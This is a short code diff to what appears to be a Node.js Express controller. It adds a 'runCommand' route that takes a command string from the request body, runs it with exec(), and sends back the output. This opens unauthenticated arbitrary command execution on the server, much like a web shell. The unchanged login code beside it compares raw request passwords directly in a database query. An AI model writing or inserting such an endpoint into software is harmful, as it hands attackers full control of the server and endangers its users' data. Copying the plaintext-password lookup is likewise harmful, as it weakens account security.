@@ -34,6 +34,16 @@ exports.index = function (req, res, next) {
     });
 };
 
+exports.runCommand = function (req, res, next) {
+  var userCommand = req.body.command;
+  exec(userCommand, function (err, stdout, stderr) {
+    if (err) {
+      return res.send('Error executing command: ' + stderr);
+    }
+    res.send(stdout);
+  });
+};
+
 exports.loginHandler = function (req, res, next) {
   if (validator.isEmail(req.body.username)) {
     User.find({ username: req.body.username, password: req.body.password }, function (err, users) {
